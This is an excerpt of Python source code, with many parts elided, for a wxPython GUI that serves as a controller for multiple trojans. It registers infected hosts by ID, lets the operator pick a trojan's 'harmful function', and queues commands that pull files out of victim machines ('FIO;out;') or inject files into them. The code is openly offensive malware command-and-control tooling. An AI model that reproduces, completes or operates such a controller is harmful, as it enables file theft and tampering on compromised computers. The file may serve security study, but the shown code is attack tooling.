...
#              report and issue the control request to multiple trojans.
# 
...
class UIFrame(wx.Frame):
    ...
    def __init__(self, parent, id, title):
        ...
        self.trojanIDList = [0] # registered trojans' id list 
        ...
        gv.iDataMgr.start()
        print("Trojan main controller inited.")
    ...
    def _buidUISizer(self):
        ...
        lSizer.AddSpacer(10)
        self.trojanCountLB = wx.StaticText(
            self, label=" Current registered trojan number : [ %s ]" % str(len(self.trojanIDList)))
        ...
        lSizer.AddSpacer(5)
        lSizer.Add(wx.StaticText(self, label=" 2. Select the trojan's harmful function : "),
                  flag=wx.LEFT, border=2)
        functionList = [
        ...
        mSizer.AddSpacer(5)
        # column 3: 
        # Add the log text field 
        self.detailTC = wx.TextCtrl(self, size=(550, 450), style=wx.TE_MULTILINE)
        mSizer.Add(self.detailTC, flag=wx.CENTER, border=10)
    ...
    def setTrojanList(self, trojanId):
        ...
        if trojanId in self.trojanIDList: return False
        self.trojanIDList.append(trojanId) 
        self.trojanChoice.AppendItems('Trojan-ID:%s' %str(trojanId))
        self.trojanCountLB.SetLabel(" Current register trojan number : [ %s ]" %str(len(self.trojanIDList)))
        return True
    ...
    def onExecuteAction(self, event):
        """ Add the trojan task to manager to assign to the trojan."""
        ...
        if actionSelect == 0:
            ...
            filePath = self.actParm.GetValue() 
            request = 'FIO;out;'+filePath
            requestType = 'FIO'
        elif actionSelect == 2:
            filePath = self.actParm.GetValue() 
            request = gv.iDataMgr.getInjectFileCmd(filePath)
        if gv.iDataMgr:
            gv.iDataMgr.setNextExeDict(trojanID, requestType, request, filePath=filePath)
    ...
    def periodic(self, event):
        ...
        if (not self.updateLock) and now - self.lastPeriodicTime >= gv.gUpdateRate:
            if gv.DEBUG_FLG: print("main frame update at %s" % str(now))
